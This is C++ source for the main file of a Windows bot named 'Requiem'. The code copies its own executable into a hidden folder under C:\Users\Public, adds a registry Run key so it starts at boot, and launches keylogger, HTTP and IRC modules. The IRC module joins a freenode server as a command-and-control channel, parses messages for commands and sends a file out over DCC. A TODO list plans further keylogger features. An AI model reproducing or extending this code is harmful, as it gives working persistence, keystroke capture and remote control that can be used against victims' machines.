/* TODO LIST:
1.) storing directory names in configs is going to get insanely inefficient. Need to think of a way to store just the basic directory in configs
and then use that to derive the rest, should use less memory and be less noticeable - just a thought.
2.) add which window is open functionality to keylogger
3.) add more keys like CTRL to keylogger
*/
#include "includes.h"

#ifdef RQIRC_H
void irc_startup();
void IRC_mainLoop(int, rqIRC);
#endif

#ifdef RQHTTP_H
void http_startup();
#endif

#ifdef KEYLOG_H
void keylog_startup();
#endif

int main()
{
	HANDLE keylogFile, debugFile;
	char tempDirName[MAX_PATH];

	sprintf(tempDirName, "%s\\%s", "C:\\Users\\Public", _folderName); //Store the folder location into tempDirName

	if (CreateDirectory(tempDirName, NULL)) { //If folder does not exist create it and create the debug file as well.
		char tempFileName[MAX_PATH];
		char buffer[] = "[CORE]: Bot Started \n";
		DWORD bytesWritten = 0;

		sprintf(tempFileName, "%s\\%s", tempDirName, _fileName); //Store whole path name in tempFileName
		
		debugFile = CreateFile(tempFileName, GENERIC_ALL, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); //Create debug file
		WriteFile(debugFile, buffer, sizeof(buffer) - 1, &bytesWritten, NULL);								 //Write to debug file

		char modFileName[MAX_PATH]; //Get current exe path name so we can copy it to the new folder we created
		GetModuleFileName(NULL, modFileName, sizeof(modFileName));

		char tempExeName[MAX_PATH]; //Set this equal to our new folder name + requiem as the exe name
		sprintf(tempExeName, "%s\\%s", tempDirName, "Requiem.exe");

		if (CopyFile(modFileName, tempExeName, TRUE)) //Copy our current program into the new directory so it can be run at startup
		{
			char lpData[MAX_PATH];//Create registry key to autorun bot
			RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Requiem", REG_SZ, (LPBYTE)&tempExeName, sizeof(tempExeName));

			char bytesToWrite[] = "[CORE]: Registry Key Added \n"; //Write to debug file
			WriteFile(debugFile, bytesToWrite, sizeof(bytesToWrite) - 1, &bytesWritten, NULL);
		}
	}

	char tempKeylogFileName[MAX_PATH];
	sprintf(keylogDir, "%s\\%s", tempDirName, _keylogFile);
	if (keylogHandle = CreateFile(keylogDir, GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) {
		char buffer[] = "[CORE]: Keylogger started \n";
		DWORD bytesWritten = 0;

		WriteFile(keylogHandle, buffer, sizeof(buffer) - 1, &bytesWritten, NULL);
		CloseHandle(keylogHandle);
	}

	//keylogHandle = CreateFile(tempKeylogFileName, GENERIC_ALL, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);




	//module startups
	#ifdef RQHTTP_H
		http_startup();
	#endif

	#ifdef KEYLOG_H
		keylog_startup();
	#endif

	#ifdef RQIRC_H
		irc_startup();
	#endif

	return 0;
}

void keylog_startup() {
	rqKEYLOG rKEYLOG;
	rKEYLOG.start();
}

#ifdef RQHTTP_H
void http_startup()
{
	rqHTTP rHTTP;
	rHTTP.start();
}
#endif

#ifdef RQIRC_H
void irc_startup()
{
	rqIRC mIRC("hitchcock.freenode.net", "Requiem", "jello246", "Bot", "rqBot", ".", 6666);
	int sock;
	WSADATA wsa_data;

	if (WSAStartup(MAKEWORD(2, 2), &wsa_data)) { //ignore its starrtup data 
		std::cout << "FML can't init winsock" << std::endl;                     
	}
	 
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	//initialize the IRC structure 
	mIRC.connect_toIRC(sock);

	//Begin main loop
	IRC_mainLoop(sock, mIRC);

	//WSA cleanupshit ignore
	WSACleanup();
}

void IRC_mainLoop(int sock, rqIRC mIRC) //Main loop to stay in IRC channel and communicate
	{
		char buffer[560]; //Buffer to hold shit
		char from[56]; //Store who sent message
		char *argument[256]; //Used to break the line into pieces and store each argument starting at base 0
		char *token_p;

		int argument_count; //Store number of arguments found on the line received
		while(1)
		{
			memset(buffer, 0, sizeof(buffer));

			if (mIRC.irc_recv_line(sock, buffer, sizeof(buffer)) == 0)
			{   std::cout << "[CORE] Connection Terminated" << std::endl;
				break; 
			}

			token_p = strtok(buffer, " ");
			argument_count = 0;

			while (token_p != NULL)
			{
				argument[argument_count] = token_p;
				token_p = strtok(NULL, " ");
				argument_count++;
			}
			// Check if the second argument on the line is a ping from the server, in which case we have to pong back in order to stay connected
			if (argument_count == 2)
			{
				if (strcmp(argument[0], "PING") == 0)
				{
					mIRC.sendLine_toIRC(sock, "PONG %s", argument[1]);
					continue;                     
				}                   
			}

			if (argument_count >= 4) //Arguments over 4 are usually ignored or a message
			{ //arg2 = sender, arg3 = message
				if (strcmp(argument[1], "PRIVMSG") == 0) //We got a message
				{
					_snprintf(from, sizeof(from), "%s", argument[2]); //Store who sent the message

					if (mIRC.search(argument[3], "hi"))
					{
						mIRC.sendLine_toIRC(sock, "PRIVMSG #Requiem :/dcc send requiem31 debug.txt");
					}
					if (argument[3][1] == mIRC.get_IRC_CMD_TRIGGER().at(0))
					{   
						*argument += (strlen(argument[0]) + 1) +
									(strlen(argument[1]) + 1) +
									(strlen(argument[2]) + 3);
					}

					continue;                         
				}  
			}
		}
	}
#endif
